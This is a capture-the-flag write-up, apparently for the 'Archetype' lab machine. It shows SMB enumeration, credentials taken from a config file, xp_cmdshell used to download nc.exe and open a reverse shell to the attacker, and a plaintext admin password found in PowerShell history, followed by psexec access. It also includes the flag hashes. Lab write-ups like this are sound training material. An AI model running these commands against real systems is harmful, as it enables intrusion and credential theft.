# Archetype

'''
export IP=10.10.10.27
'''

'''
open Ports
'''
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM

target name: ARCHETYPE
smb was detected
computer name: Archetype
account: guest
auth_level: user

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC

Able to access backups smb share
smbclient //$IP/backups

We found a config file within the root of this share
prod.dtsConfig

<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>

Gained access to the MS SQL server with the above creds
impacket-mssqlclient sql_svc:M3g4c0rp123@IP -window-auth

Uploaded into TEMP folder nc.exe and ran it to execute a reverse shell on our machine we ran python3 -m http.server to host the web server for downloading the nc.exe from sql server

in sql server we used:
xp_cmdshell powershell wget http://$IP:8000/nc.exe -OutFile %TEMP&\nc.exe

once we downloaded that file, using nc we listened on port 1234 for connection

on the sql machinr we then ran the command nc.exe to execute a reverse shell 
xp_cmdshell powershell %TEMP&\nc.exe -nv $IP 1234 -e cmd.exe

We now have access to a remote shell

we found user.txt in the Desktop of sql_svc user
3e7b102e78218e935bf3f4951fec21a3

we checked the powershell ConsoleHost:history.txt file we found that the previous user had logged in to backups using the admin user with a password type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

Using impacket-psexec we were able to log into the system as an administrator.
We then navigated to the Admins Home directory and to its Desktop filder and found a root.txt

b91ccec3305e98240082d4474b848528